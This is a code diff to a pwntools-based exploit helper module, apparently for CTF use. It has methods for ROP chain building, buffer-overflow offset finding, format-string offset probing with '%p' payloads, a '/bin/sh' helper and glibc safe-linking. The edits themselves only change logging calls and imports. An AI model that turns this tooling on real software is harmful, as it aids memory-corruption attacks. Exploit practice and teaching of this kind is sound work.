@@ -1,4 +1,4 @@
-from pwn import log, context, cyclic, unpack, log, asm, flat
+from pwn import log, context, cyclic, unpack, log, asm, flat, rol, ror
 import pwn
 import re
 import math
@@ -101,7 +101,7 @@ class PwnContext:
                 rop.call(func)
 
         rop.raw(rop.ret.address)
-        info(f"ROP :\n{rop.dump()}")
+        log.info(f"ROP :\n{rop.dump()}")
         return rop.chain()
 
 
@@ -114,7 +114,7 @@ class PwnContext:
         self.offset = cyclic_find(core.fault_addr)
         self.proc.close()
         self.proc = None
-        info(f"{self.offset = }")
+        log.info(f"{self.offset = }")
 
     def bof(self, data, **kwargs):
         if self.offset is None:
@@ -165,7 +165,7 @@ class PwnContext:
         payload = "A" * context.bytes + ".%p" * n
         self.send(payload)
         output = self.recv().split(".")
-        info(f"format string : {output}")
+        log.info(f"format string : {output}")
         return output.index("0x" + "41" * context.bytes)
 
     def binsh(self):
@@ -261,7 +261,7 @@ def printx(**kwargs):
 def hexdump(data, s=context.word_size//8):
     idx_max = math.ceil(math.log(len(data), 16))
     for i in range(0, len(data), s):
-        info(f"%0{idx_max}x: %#0{2*s+2}x" % (i, u64(data[i:i+s])))
+        log.info(f"%0{idx_max}x: %#0{2*s+2}x" % (i, u64(data[i:i+s])))
 
 def safelink(addr, ptr):
         return (addr >> 12) ^ ptr
